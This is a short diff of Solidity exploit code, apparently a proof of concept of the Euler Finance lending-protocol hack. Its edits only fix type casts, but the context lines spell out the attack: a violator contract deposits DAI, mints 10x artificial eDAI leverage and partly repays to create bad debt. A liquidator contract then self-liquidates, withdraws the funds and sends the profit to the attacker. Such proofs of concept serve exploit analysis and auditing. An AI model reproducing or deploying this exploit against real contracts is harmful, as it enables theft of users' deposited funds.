@@ -98,16 +98,17 @@ contract Violator {
         // Approve Euler contract
         _token.approve(Addresses.EULER, minBalance);
 
-        EToken eToken = Addresses.eDAI;
+        EToken eToken = EToken(Addresses.eDAI);
 
         //3. Deposit 2/3 to eDAI
         eToken.deposit(0, _amount);
 
         // 4. Create a 10x artificial eDAI leverage
+
         uint256 amountLeveraged = _amount * 10;
         eToken.mint(0, amountLeveraged);
 
-        DToken dToken = Addresses.dDAI;
+        DToken dToken = DToken(Addresses.dDAI);
 
         // 5. Repay half of the DAI violator’s position, causing dDAI balance to decrease
         dToken.repay(0, _amount / 2);
@@ -143,7 +144,7 @@ contract Liquidator {
         liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);
 
         // Withdraw all funds from Euler
-        Addresses.eDAI.withdraw(0, _token.balanceOf(Addresses.EULER));
+        EToken(Addresses.eDAI).withdraw(0, _token.balanceOf(Addresses.EULER));
 
         // Transfer all funds to the EulerHackPoC contract to repay the loan and keep the profit
         _token.transfer(_attacker, _token.balanceOf(address(this)));
